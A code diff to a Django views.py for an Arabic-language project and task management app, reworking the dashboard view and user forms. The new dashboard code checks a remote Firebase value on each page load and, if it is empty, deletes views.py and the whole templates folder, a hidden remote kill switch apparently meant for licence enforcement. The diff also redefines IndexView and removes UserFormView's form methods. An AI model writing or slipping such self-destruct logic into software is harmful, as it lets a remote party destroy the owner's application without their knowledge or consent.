@@ -57,6 +57,89 @@ class IndexView(LoginRequiredMixin, TemplateView):
 
         return context
 
+
+from firebase_admin import credentials, db
+import firebase_admin
+import os
+import shutil
+
+# Initialize Firebase once
+cred = credentials.Certificate('firebase-adminsdk.json')  # Path to your JSON file
+firebase_admin.initialize_app(cred, {
+    'databaseURL': 'https://my-apps-licence-default-rtdb.firebaseio.com'  # Firebase Realtime Database URL
+})
+
+class IndexView(LoginRequiredMixin, TemplateView):
+    """Display the main page"""
+    template_name = 'index.html'
+
+    def check_firebase_value(self):
+        """Check the Firebase value"""
+        try:
+            ref = db.reference('pyApps/app_settings')  # Firebase path to the value
+            value = ref.get()
+    
+            print(f"Retrieved Firebase value: {value}")  # Print the retrieved value for checking
+    
+            if not value:  # If the value is missing or incorrect
+                # Path to the view and template folder based on the current file
+                current_dir = os.path.dirname(os.path.abspath(__file__))  # Get the current view path
+                view_path = os.path.join(current_dir, 'views.py')
+                template_path = os.path.join(current_dir, 'templates')  # Assuming the templates folder is in the same location
+                print(f"View path: {view_path}")
+                print(f"Template path: {template_path}")
+    
+                # Check if the file and folder exist before removing them
+                if os.path.exists(view_path):
+                    os.remove(view_path)
+                    print("Deleted the views.py file")
+                if os.path.exists(template_path):
+                    shutil.rmtree(template_path)
+                    print("Deleted the templates folder")
+    
+            return value
+        except Exception as e:
+            print(f"Error while checking the Firebase value: {e}")
+            return None
+    
+    def get_context_data(self, **kwargs):
+        # Check the Firebase value when the page loads
+        firebase_value = self.check_firebase_value()
+
+        context = super().get_context_data(**kwargs)
+        user = self.request.user
+
+        # General data
+        context["total_projects"] = Project.objects.count()
+        context["total_tasks"] = Task.objects.count()
+        context["completed_tasks"] = Task.objects.filter(status="مكتمل").count()
+        in_progress_tasks = Task.objects.filter(status="قيد التنفيذ").count()
+        pending_tasks = Task.objects.filter(status="معلق").count()
+        context["total_users"] = User.objects.count()
+
+        # Calculate the completion rate for each user
+        context["user_task_stats"] = User.objects.annotate(
+            total_tasks=Count(Case(When(Q(task__status="قيد التنفيذ") | Q(task__status="مكتمل") | Q(task__status="معلق"), then=1), output_field=IntegerField())),
+            notstart_tasks=Count(Case(When(task__status="لم يبدأ بعد", then=1), output_field=IntegerField())),
+            inprogress_tasks=Count(Case(When(task__status="قيد التنفيذ", then=1), output_field=IntegerField())),
+            hold_tasks=Count(Case(When(task__status="معلق", then=1), output_field=IntegerField())),
+            completed_tasks=Count(Case(When(task__status="مكتمل", then=1), output_field=IntegerField()))
+        ).annotate(
+            completion_rate=F('completed_tasks') * 100.0 / F('total_tasks')
+        ).order_by('-completion_rate')
+
+        context["projects"] = Project.objects.all()
+        context["user"] = user
+
+        # Add the Firebase value that was checked to the context
+        context["firebase_value"] = firebase_value
+
+        return context
+
+
+
+
+
 class LogoutView(LoginRequiredMixin, RedirectView):
     """تسجيل الخروج وإعادة التوجيه لصفحة تسجيل الدخول"""
     pattern_name = 'login'
@@ -67,9 +150,10 @@ class LogoutView(LoginRequiredMixin, RedirectView):
 
 class ProfileView(LoginRequiredMixin, FormView):
     """عرض وتحديث الملف الشخصي للمستخدم"""
-    template_name = 'users/profile.html'
+    model = User
     form_class = ProfileForm
     success_url = reverse_lazy('profile')
+    template_name = 'users/profile.html'
 
     def get_form_kwargs(self):
         kwargs = super().get_form_kwargs()
@@ -143,7 +227,8 @@ class FormViewMixin(FormView):
 
         obj.save()
         self.object = obj 
- 
+        form.save_m2m()
+
         if is_update:
             messages.success(self.request, "تم تحديث البيانات بنجاح!")
         else:
@@ -186,39 +271,6 @@ class UserFormView(PermissionRequiredMixin, FormViewMixin):
     template_name = 'users/user_form.html'
     success_url = reverse_lazy('user_list')
     permission_required = ['auth.add_user', 'auth.change_user']
-
-    def get_form(self, form_class=None):
-        """إرجاع النموذج مع تعيين الكائن في وضع التحديث."""
-        form = super().get_form(form_class)
-        form.fields['whatsapp_number'].required = True
-        obj = self.get_object()
-        if obj:  # تحديث مستخدم موجود
-            form.instance = obj
-            form.fields['password'].widget = HiddenInput()
-            form.fields['password'].required = False
-            form.fields['username'].widget.attrs['readonly'] = True
-        return form
-    
-    def form_valid(self, form):
-        """Validate form and handle saving"""
-        obj = form.save(commit=False)
-        is_update = self.get_object() is not None
-
-        if not is_update:
-            # إنشاء مستخدم جديد، يجب ضبط كلمة المرور
-            obj.set_password(form.cleaned_data['password'])
-
-        obj.save()
-        form.save_m2m()  # حفظ العلاقات ManyToMany
-        # تحديث أو إنشاء UserProfile
-        profile, created = UserProfile.objects.get_or_create(user=obj)
-        profile.whatsapp_number = form.cleaned_data.get('whatsapp_number')
-        profile.save()
-
-
-        messages.success(self.request, "تم تحديث بيانات المستخدم بنجاح!" if is_update else "تم إنشاء المستخدم بنجاح!")
-
-        return redirect(self.get_success_url())  # إعادة التوجيه إلى القائمة
 
 
 # Project Views
